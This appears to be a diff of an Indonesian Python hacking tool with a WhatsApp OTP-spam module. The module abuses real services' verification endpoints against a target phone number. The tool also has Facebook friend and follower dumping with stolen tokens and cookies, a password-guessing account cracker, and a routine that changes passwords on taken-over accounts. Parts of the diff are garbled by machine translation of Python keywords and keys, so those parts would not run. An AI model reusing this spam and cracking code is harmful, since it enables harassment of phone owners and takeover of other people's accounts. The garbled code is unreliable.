+	cetak(panel(f''' Masukan Nomor Target Yang Ingin Di Spam Contoh : +6281234567xxx''',width=90,padding=(0,8),style=f"bold white"))
+	nomor = masukan(f" [+] Masukan No Hp : +62").replace("+62","")
+	jika nomor == "":
+		lulus
+	kalau tidak:
+		sementara Benar:
+			untuk _ dalam track(range(100), description=f' [+] Sedang Spam...'):process_data1()
 			sxp_wa()
 			
-class sxp_wa:
+kelas sxp_wa:
 
-	def __init__(self):
-		self.req = requests.Session()
-		self.main()
+	def __init__(diri sendiri):
+		self.req = request.Session()
+		diri.main()
 
-	def wa_otp_1(self, no):
-		nickname = random.choice(
+	def wa_otp_1(mandiri, tidak):
+		nama panggilan = acak.pilihan(
 					  [
 					    "fahmi",
 					    "xzc0der",
-					    "bed3bah",
+					    "tempat tidur3bah",
 					    "xmanz"
 					  ]
 					 )
-		angka = random.randint(
+		angka = acak.randint(
 					111,
 					999
 				       )
 		__req__ = self.req.post("https://wong.kitabisa.com/register/draft",
-			headers = {
+			tajuk = {
 				    "Host": "wong.kitabisa.com",
 				    "x-ktbs-platform-name": "pwa",
-				    "origin": "https://account.kitabisa.com",
+				    "asal": "https://account.kitabisa.com",
 				    "x-ktbs-time": "1611020248",
-				    "user-agent": agent,
+				    "agen-pengguna": agen,
 				    "x-ktbs-api-version": "1.0.0",
-				    "accept": "application/json",
+				    "terima": "aplikasi/json",
 				    "x-ktbs-client-name": "kanvas",
 				    "x-ktbs-request-id": "107790c3-86e0-4872-9dfb-b9c5da9bfa13",
 				    "x-ktbs-client-version": "1.0.0",
 				    "x-ktbs-signature": "e6b4dd627125b3ccd53de193d165c481cc7fdfef0b1dcd7a587636a008fdc89e",
-				    "version": "3.4.0",
+				    "versi": "3.4.0",
 				    "referer": "https://account.kitabisa.com/register/otp?type=sms",
 				    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 				   },
 			json = {
-				 "full_name": nickname+str(angka),
-				 "username": f"0{no}",
+				 "nama_lengkap": nama panggilan+str(angka),
+				 "nama pengguna": f"0{tidak}",
 				 "otp_type": "whatsapp"
 				}
-		).text
+		).teks
 
-	def wa_otp_2(self, no):
+	def wa_otp_2(mandiri, tidak):
 		__req__ = self.req.get(
 			f"https://m.redbus.id/api/getOtp?number={no}&cc=62&whatsAppOpted=true"
-		).text
+		).teks
 
-	def wa_otp_3(self, no):
+	def wa_otp_3(mandiri, tidak):
 		__req__ = self.req.post("https://api.bukuwarung.com/api/v1/auth/otp/send",
-			headers = {
-				    "Accept": "application/json",
+			tajuk = {
+				    "Terima": "aplikasi/json",
 				    "X-APP-VERSION-NAME": "3.4.0",
 				    "X-APP-VERSION-CODE": "3399",
-				    "Content-Type": "application/json; charset=UTF-8",
+				    "Jenis Konten": "aplikasi/json; charset=UTF-8",
 				    "Host": "api.bukuwarung.com",
-				    "Connection": "Keep-Alive",
-				    "Accept-Encoding": "gzip",
-				    "User-Agent": agent
+				    "Koneksi": "Tetap Hidup",
+				    "Terima-Pengkodean": "gzip",
+				    "Agen-Pengguna": agen
 				   },
 			json = {
-				 "action": "LOGIN_OTP",
-				 "countryCode": "62",
+				 "aksi": "LOGIN_OTP",
+				 "kode negara": "62",
 				 "deviceId": "00000177-142d-f1a2-bac4-57a9039fdc4d",
-				 "method": "WA",
-				 "phone": no
+				 "metode": "WA",
+				 "No Telepon
 				}
-		).text
+		).teks
 
-	def wa_otp_4(self, no):
+	def wa_otp_4(mandiri, tidak):
 		__req__ = self.req.post("https://evermos.com/api/client/request-code",
-			headers = {
-				    "user-agent": agent
+			tajuk = {
+				    "agen-pengguna": agen
 				  },
 			data = {
-				 "telephone": f"62{no}",
-				 "type": 0
+				 "telepon": f"62{no}",
+				 "ketik": 0
 				}
-		).text
+		).teks
 
-	def wa_otp_5(self, no):
+	def wa_otp_5(mandiri, tidak):
 		__req__ = self.req.post("https://wapi.ruparupa.com/auth/generate-otp",
-			headers = {
+			tajuk = {
 				    "Host": "wapi.ruparupa.com",
-				    "Connection": "keep-alive",
+				    "Koneksi": "tetap hidup",
 				    "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
-				    "Accept": "application/json",
-				    "Content-Type": "application/json",
+				    "Terima": "aplikasi/json",
+				    "Jenis-Konten": "aplikasi/json",
 				    "X-Company-Name": "odi",
-				    "user-agent": agent,
-				    "user-platform": "mobile",
-				    "X-Frontend-Type": "mobile",
-				    "Origin": "https://m.ruparupa.com",
-				    "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
+				    "agen-pengguna": agen,
+				    "user-platform": "seluler",
+				    "X-Frontend-Type": "seluler",
+				    "Asal": "https://m.ruparupa.com",
+				    "Perujuk": "https://m.ruparupa.com/verification?page=otp-choices",
 				    "Accept-Encoding": "gzip, deflate, br",
 				    "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 				   },
 			json = {
-				 "phone": f"0{no}",
-				 "action": "register",
-				 "channel": "chat",
-				 "email": "",
-				 "customer_id": "0",
-				 "is_resend": 0
+				 "telepon": f"0{tidak}",
+				 "aksi": "daftar",
+				 "saluran": "obrolan",
+				 "surel": "",
+				 "custom_id": "0",
+				 "adalah_kirim ulang": 0
 				}
-		).text
+		).teks
 
-	def wa_otp_6(self, no):
-		headers = {
-			    "Connection": "keep-alive",
-			    "Accept": "application/json, text/javascript, */*; q=0.01",
-			    "Origin": "https://accounts.tokopedia.com",
+	def wa_otp_6(mandiri, tidak):
+		tajuk = {
+			    "Koneksi": "tetap hidup",
+			    "Terima": "aplikasi/json, teks/javascript, */*; q=0,01",
+			    "Asal": "https://accounts.tokopedia.com",
 			    "X-Requested-With": "XMLHttpRequest",
-			    "user-agent": agent,
-			    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+			    "agen-pengguna": agen,
+			    "Jenis-Konten": "aplikasi/x-www-form-urlencoded; charset=UTF-8",
 			    "Accept-Encoding": "gzip, deflate",
 			   }
 		site = self.req.get("https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn="+ no +"&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D", headers = headers).text
@@ -867,34 +911,34 @@ class sxp_wa:
 			 "tk": search,
 			 "email": "",
 			 "original_param": "",
-			 "user_id": "",
-			 "signature": "",
+			 "identitas pengguna": "",
+			 "tanda tangan": "",
 			 "number_otp_digit": "6",
 			}
 		__req__ = self.req.post(
-				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", headers = headers, data = data
-	   ).text
+				"https://accounts.tokopedia.com/otp/c/ajax/request-wa", header = header, data = data
+	   ).teks
 
-	def main(self):
+	def utama(diri sendiri):
 		self.wa_otp_1(nomor)
 		self.wa_otp_2(nomor)
 		self.wa_otp_3(nomor)
 		self.wa_otp_4(nomor)
 		self.wa_otp_5(nomor)
 		self.wa_otp_6(nomor)
-		cetak(panel(f" Sukses Spam WA Ke No : {K2}+62{nomor}",width=90,padding=(0,2),style=f"bold white"))
+		cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold white"))
 	
-###----------[ DUMP PENGIKUT ]---------- ###
+###---------[ DUMP PENGIKUT ]---------- ###
 def pengikut():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-	except IOError:
-		exit()
-	ses = requests.Session()
+	mencoba:
+		token = buka('.token.txt','r').baca()
+		cok = buka('.cok.txt','r').baca()
+	kecuali kesalahan IOE:
+		KELUAR()
+	ses = permintaan.Sesi()
 	cetak(panel(f"Ketik 'Me' Jika Ingin Crack Dari Total Followers Anda Sendiri",width=90,padding=(0,7),style=f"bold white"))
 	akun = console.input(f' [+] Masukan Id Target : ')
-	try:
+	mencoba:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
 			try:
@@ -912,12 +956,30 @@ def pengikut():
 		print(f" [+] Gagal Dump Id, Kemungkinan Akun Private")
 		time.sleep(3);exit()
 
+#----------------------[ MENU CRACK LAINNYA ]----------------------#
+def lainnya():
+	cetak(panel(f"[[bold cyan]01[bold white]] Crack Username [[bold green] ON [bold white]]                  [[bold cyan]03[bold white]] Crack File [[bold green] ON [bold white]]\n[[bold cyan]02[bold white]] Crack Followers [[bold green] ON [bold white]]                 [[bold cyan]04[bold white]] Crack Email [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold white"))
+	bray = input(f' [+] Pilih Menu Crack : ')
+	if bray in(''):
+		print(' [+] Pilih Yang Bener Asu ');back()
+	if bray in('1','01'):
+		crack_nama()
+	elif bray in('2','02'):
+		pengikut()
+	elif bray in('3','03'):
+		crack_file()
+	elif bray in('4','04'):
+		crack_email()
+	else:
+		print(' [+] Pilih Yang Bener Asu ')
+		exit()
+		
 #----------------------[ CRACK USERNAME ]----------------------#
 def crack_nama():
 	nama = []
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
-	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
-	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
+	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
+	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 3.000 Username",width=90,padding=(0,2),style=f"bold white"))
 	nam = console.input(f' [+] Masukan Nama : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
@@ -1025,8 +1087,8 @@ def crack_file():
 		setting()
 #-----------------[ HASIL-CRACK ]-----------------#
 def result():
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
-	kz = input(f'[+]Pilih : ')
+	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold red]Kembali[/]',width=90,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
+	kz = input(f' [+] Pilih : ')
 	if kz in ['2','02']:
 		try:vin = os.listdir('CP')
 		except FileNotFoundError:
@@ -1055,7 +1117,7 @@ def result():
 			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+]  Pilih Yang Bener Kontol ')
+				print(' [+] Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
@@ -1126,14 +1188,13 @@ def brayen_dump():
 		kukis = open('.cok.txt','r').read()
 	except IOError:
 		exit()
-	cetak(panel('\t[bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
+	cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold white'))
 	pil = input(f' [+] Masukan ID Target : ')
 	try:
 		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': kukis}).json()
 		for pi in koH['friends']['data']:
 			try:id.append(pi['id']+'|'+pi['name'])
 			except:continue
-		print('')
 		print(f' [+] Total ID yang Terkumpul : {h}'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
@@ -1151,7 +1212,7 @@ def dump_massal():
 		exit()
 	try:
 		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
-		jum = int(input(f' [+] Mau Berapa Idz Target {x} : '))
+		jum = int(input(f' [+] {P}Mau Berapa Idz Target {x} : '))
 	except ValueError:
 		print(' [+] Wrong input ')
 		exit()
@@ -1162,7 +1223,7 @@ def dump_massal():
 	yz = 0
 	for met in range(jum):
 		yz+=1
-		kl = input(f' {P}Masukan Idz Target Yang Ke '+str(yz)+' : ')
+		kl = input(f' [+] {P}Masukan Idz Target Yang Ke '+str(yz)+' : ')
 		uid.append(kl)
 	for userr in uid:
 		try:
@@ -1192,7 +1253,7 @@ def dump_massal():
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
 	print('')
-	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
+	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Crack Idz Old [[bold red]Not Recommended[bold white]][/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Crack Idz New [[bold green]Very Recommended[bold white]][/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Crack Idz Random [[bold green]Very Recommended[bold white]][/]',width=90,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
 	hu = input(f' [+] Pilih Urutan Idz : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -1212,13 +1273,13 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(' [+] SALAH COYY ')
+		print(' [+] Pilih Yang Bener Kontooll ')
 		exit()
 	urut = []
-	urut.append(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Login Site ValidateV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Login Site MbasicV1 [bold green]Very Recommended[bold white] [/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Login Site FreeV1 [bold green]Recommended[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold white]Login Site RegulerV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Login Site MbasicV2 [bold green]Very Recommended[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Login Site FreeV2 [bold green]Recommended[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold green]07[/][bold white]][/] [bold white]Login Site Async [bold green]Recommended[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold green]08[/][bold white]][/] [bold white]Login Site B-Api [bold green]Recommended[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=45,title=f"[bold green]Validate",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login Site [bold green]free.facebook.com[bold white] ',width=45,title=f"[bold green]Reguler",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white]  ',width=45,title=f"[bold green]Async",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site [bold green]developer.facebook.com[bold white]  ',width=45,title=f"[bold green]B-Api",style=f"bold white"))
 	console.print(Columns(urut))
 	hc = input(f' [+] Pilih Metode : ')
 	if hc in ['1','01']:
@@ -1239,9 +1300,9 @@ def setting():
 	    method.append('bapi')
 	else:
 		method.append('validate1')
-	cetak(panel('''[bold white][[bold green]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold green]Recommended[bold white]]
-[bold white][[bold green]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold green]Very Recommended[bold white]]
-[bold white][[bold green]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',width=90))
+	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold green]Recommended[bold white]]
+[bold white][[bold cyan]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold green]Very Recommended[bold white]]
+[bold white][[bold cyan]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',width=90))
 	pwplus=input(f' [+] {P}Pilih Sandi : ')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
@@ -1252,17 +1313,17 @@ def setting():
 	else:
 		pwpluss.append('no')
 	
-	cetak(panel(f'[bold white]Apakah Anda Ingin Menghapus Dosa Anda? Agar Anda Masuk Surga Y/T',width=90,title=f"[bold green]Penghapus Dosa",style=f"bold white"))
+	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
 	_brayen_ = input(' [+] Pilih : ')
 	if _brayen_ in ['']:
-		print(' [+] Pilih Yang Benar Cok ')
+		print(' [+] Pilih Yang Bener Kontol ')
 		back()
 	elif _brayen_ in ['y','Y']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
 
-	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]User-Agent",style=f"bold white"))
+	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold white"))
 	uatambah = input(f' [+] Pilih : ')
 	if uatambah in ['y','Ya','ya','Y']:
 		ualuh.append('ya')
@@ -1279,7 +1340,7 @@ def passwrd():
 	urut.append(panel(f'        [bold green]%s [bold white]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold white"))
 	urut.append(panel(f'         [bold yellow]%s [bold white]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold white"))
 	wa.print(Columns(urut))
-	cetak(panel(f'[bold white]On/Off Mode Pesawat Setiap 1000 Idz Agar Anda Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
+	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
 	des = prog.add_task('',total=len(id2))
 	with prog:
@@ -1583,8 +1644,8 @@ def reguler2(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[bold yellow]+---> {idf}|{pw}")
-				tree.add(f"[bold yellow]+---> {ua}\n")
+				tree.add(f"[bold yellow]{idf}|{pw}")
+				tree.add(f"[bold yellow]{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1595,8 +1656,8 @@ def reguler2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[bold green]+---> {idf}|{pw}")
-				tree.add(f"[bold green]+---> {kuki}\n")
+				tree.add(f"[bold green]{idf}|{pw}")
+				tree.add(f"[bold green]{kuki}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -1956,11 +2017,11 @@ def mengecek(user,pw):
 						dat2.update({"password_new":"".join(pwbaru)})
 						an=session.post(url+link3.get("action"),data=dat2)
 						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di 🥳🥳 \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
+						print("\r%s%s\033[0mAkun One Tab, Sandi Berhasil Di Ubah \n [+] OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
 						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
 						#cek_apk(coki)
 				else:
-					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda 🥳🥳		"%(H,til))
+					print("\r%s%s \033[0mAkun One Tab, Silahkan Anda Login		"%(H,til))
 					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
 					#cek_apk(coki)
 			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
@@ -1969,7 +2030,7 @@ def mengecek(user,pw):
 				print("%s%s\033[0mTerjadi Kesalahan"%(M,til))
 		else:
 			if "c_user" in session.cookies.get_dict():
-				print("\r%s%s Selamat Akun Anda Tidak Checkpoint Silahkan Masuk Lewat FB🥳🥳 "%(H))
+				print("\r%s%s Akun Tidak Checkpoint, Silahkan Anda Login "%(H))
 				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
 		for opsi in range(len(cek)):
 			number +=1
